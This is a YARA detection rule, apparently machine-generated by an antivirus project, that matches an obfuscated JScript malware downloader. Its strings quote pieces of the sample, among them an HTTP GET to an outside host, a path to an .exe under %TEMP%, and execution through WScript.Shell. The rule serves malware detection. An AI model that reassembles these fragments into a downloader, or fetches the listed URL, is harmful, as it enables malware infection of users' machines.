rule sig_20160328_9a97797edf2252dbc7259f328103947b {
  meta:
    description = "datamaliciousorder - file 20160328_9a97797edf2252dbc7259f328103947b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "1d0e5a76c52ae9ceddb52fc94b1ed15675ac26c47f9ba32fed2b52f21e9b4b6b"

  strings:
    $s1  = "function Xbqllovwji() {return Cgnoaql[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"GsPmF30qN.exe\";};" fullword ascii
    $s2  = "Wkbzf[Zpbalce](\"GET\", \"http://themesbin.com/k9sjaf\", false);" fullword ascii
    $s3  = "do {WScript[Bewyvv](Nqvoowhpwp() * 11)} while (Wkbzf[\"readystate\"] < 4 );" fullword ascii
    $s4  = "function Aigtbocy(Ywyntu, Ratwosa){return Ywyntu - Ratwosa;};" fullword ascii
    $s5  = "var Cgnoaql = function Mlhfhekbgl() {return WScript[Bzemk](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Ipgewqvr(Xgijeb){Cgnoaql[\"Run\"](Xgijeb, Peviqpx, Peviqpx);};" fullword ascii
    $s7  = "function Tjngqk() {return ((Ylnqlr == true) && (Ylnqlr == Mlbuupgv)) ? 1 : Peviqpx;};" fullword ascii
    $s8  = "Ylnqlr = true; " fullword ascii
    $s9  = "Mlbuupgv = true; " fullword ascii
    $s10 = "var Mlbuupgv = false;" fullword ascii
    $s11 = "function Svipoel(){return Cmxine;};" fullword ascii
    $s12 = "return Aigtbocy(Pmhqau, Gabnsvottv);" fullword ascii
    $s13 = "function Csfwjef(Xyacx) {var Npinl = (1, 2, 3, 4, 5, Xyacx); return Npinl;};" fullword ascii
    $s14 = "function Wttkq()" fullword ascii
    $s15 = "var Wtcfqeg = new this[\"Date\"]();" fullword ascii
    $s16 = "function Nqvoowhpwp(){return 22;};" fullword ascii
    $s17 = "function Seikvbpsu(){return Bzemk;};" fullword ascii
    $s18 = "var Ylnqlr = false;" fullword ascii
    $s19 = " while (Lfjmmggkws){" fullword ascii
    $s20 = "var Texxlgojy = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}